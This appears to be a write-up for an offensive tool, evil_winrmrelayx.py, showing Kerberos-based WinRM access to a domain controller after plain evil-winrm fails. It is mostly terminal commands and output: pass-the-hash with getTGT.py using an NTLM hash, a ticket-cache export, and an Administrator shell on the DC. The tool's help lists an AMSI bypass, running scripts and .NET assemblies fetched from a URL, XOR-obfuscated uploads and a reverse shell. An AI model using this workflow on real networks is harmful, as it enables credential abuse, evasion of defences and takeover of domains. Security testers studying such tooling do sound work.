## Write-Ups Exec

Testing scenario on WinRm session when DC require Kerberos and Ticket authentication.

*With regular evil-winrm:*

```sh
┌──(root㉿kali)-[/]
└─# export KRB5CCNAME=Administrator.ccache

┌──(root㉿kali)-[/]
└─# evil-winrm -i 192.168.221.66 -u Administrator -r dc02.tesla.corp --port 5986
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
```

Kerberos error in Winrm authentication:

<a href="https://github.com/byt3n33dl3/winrmrelayx"><p align="left">
<img src="/local/src/img/krb-error.png" width="200px">
</p></a>

*With evil_wirnmrelayx.py:*

```sh
┌──(root㉿kali)-[/]
└─# getTGT.py TESLA.CORP/Administrator -hashes aad3b435b51572eeaad3b435b51572ee:56855ee6b7570ed3fde6ac26220a757e
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/]
└─# export KRB5CCNAME=Administrator.ccache                                                                        
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/]
└─# python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass dc02.tesla.corp
[*] '-target_ip' not specified, using dc02.tesla.corp
[*] '-url' not specified, using https://dc02.tesla.corp:5986/wsman
[*] using domain and username from ccache: TESLA.CORP\administrator
[*] '-spn' not specified, using HTTP/dc02.tesla.corp@TESLA.CORP
[*] '-dc-ip' not specified, using TESLA.CORP
[*] requesting TGS for HTTP/dc02.tesla.corp@TESLA.CORP

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\Administrator\Documents> whoami
Tesla\Administrator
```

## CONTACT

For more, come to my collections of write-ups for real-world use cases and write-ups [here](https://byt3n33dl3.substack.com), if there's any security concern, please contact me at <byt3n33dl3@pm.me>